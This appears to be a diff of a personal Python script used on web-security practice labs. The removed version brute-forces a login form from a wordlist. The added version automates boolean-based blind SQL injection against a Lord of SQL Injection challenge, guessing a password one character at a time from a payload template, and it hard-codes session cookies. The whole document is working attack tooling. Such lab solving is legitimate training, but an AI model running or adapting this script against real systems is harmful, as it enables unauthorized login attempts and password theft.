@@ -1,38 +1,28 @@
+import string
 import requests
-url = "https://0a0600a804a7c555c0f72efe008300a2.web-security-academy.net/login"
+url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
 session = requests.Session()
-cookie = {
-    "session" : "WwD0M0iOtMukcVwX1z2Z5YznRBurkGE2"
+char = string.printable
+header = {
+    'Cookie' : "PHPSESSID=m71i19igi78valu1kj9kccu53j"
 }
-f = open("cheatsheet.txt" , "r")
-c = int(input("How many data : "))
-d = []
-for i in range(0,c):
-    d.append(input("Data %d : " %(i))) 
+f1 = open("boolean.txt", "r")
 
-bf_data = int(input("Choose data to bf : "))
-data = {}
-for i in range(0,len(d)):
-    if i != bf_data:
-        add = {
-            d[i] : input("%s : " %(d[i]))
-        }
-        data.update(add)
-    else:
-        add = {
-            d[i] : "test"
-        }
-        data.update(add)    
-
-
-# print(data)
-# data[d[bf_data]] = "concac"
-# print(data[d[bf_data]])
-# print(data)
-sp = input("Sepecial str :")
-for i in f:
-    data[d[bf_data]] = i
-    
-    post = session.post(url = url , cookies= cookie , data=data)
-    if sp not in post.text:
-        print(len(post.text) , i )
+p = "no"
+pw_choose = "1." + input("payload : ")
+sp = input("special: ")
+len_pw = int(input("length :"))
+password = ""
+s_p = input("Sepecial params : ")
+for i in range(1, len_pw):
+    for j in char:
+        pass_1 = password + j
+        pw = pw_choose.replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", pass_1).replace("\n", "")
+        get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")
+        print(len(get.text), pw[2:], get.url)
+        if (sp in get.text):
+            print(len(get.text), pw[2:], get.url)
+            password = password + j
+            print(password)
+            break
+f1.close()
